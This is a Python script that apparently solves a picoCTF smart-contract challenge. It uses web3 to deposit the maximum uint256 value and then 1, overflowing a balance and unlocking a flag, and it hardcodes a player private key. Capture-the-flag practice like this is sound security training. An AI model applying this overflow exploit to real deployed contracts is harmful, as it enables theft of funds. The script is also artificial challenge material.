from web3 import Web3 # type: ignore

RPC   = "http://mysterious-sea.picoctf.net:50832"
BANK  = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
PKEY  = "0xa9141e4dafcd65d1faf4577981b157ed53f0b1a280f48f3b6e82f10a1d85c839"

ABI = [
    {"name":"deposit",  "type":"function","inputs":[{"name":"amount","type":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},
    {"name":"getFlag",  "type":"function","inputs":[],"outputs":[{"name":"","type":"string"}],"stateMutability":"view"},
    {"name":"balances", "type":"function","inputs":[{"name":"","type":"address"}],"outputs":[{"name":"","type":"uint256"}],"stateMutability":"view"},
    {"name":"revealed", "type":"function","inputs":[],"outputs":[{"name":"","type":"bool"}],"stateMutability":"view"},
]

w3       = Web3(Web3.HTTPProvider(RPC))
account  = w3.eth.account.from_key(PKEY)
contract = w3.eth.contract(address=Web3.to_checksum_address(BANK), abi=ABI)

print("Connected:", w3.is_connected())
print("Player:", account.address)

def send_tx(fn):
    tx = fn.build_transaction({
        'from':  account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas':   100000,
        'gasPrice': w3.eth.gas_price,
    })
    signed  = w3.eth.account.sign_transaction(tx, PKEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)

MAX_UINT256 = 2**256 - 1

# Step 1: deposit(2^256 - 1)
print("\n[1] Depositing MAX_UINT256...")
r = send_tx(contract.functions.deposit(MAX_UINT256))
print("    tx:", r.transactionHash.hex(), "| status:", r.status)

bal = contract.functions.balances(account.address).call()
print("    Balance now:", bal)

# Step 2: deposit(1) → overflow → triggers flag
print("\n[2] Depositing 1 to trigger overflow...")
r = send_tx(contract.functions.deposit(1))
print("    tx:", r.transactionHash.hex(), "| status:", r.status)

bal = contract.functions.balances(account.address).call()
print("    Balance after overflow:", bal)
print("    Revealed:", contract.functions.revealed().call())

# Step 3: get the flag
print("\n[3] Getting flag...")
flag = contract.functions.getFlag().call()
print("\n FLAG:", flag)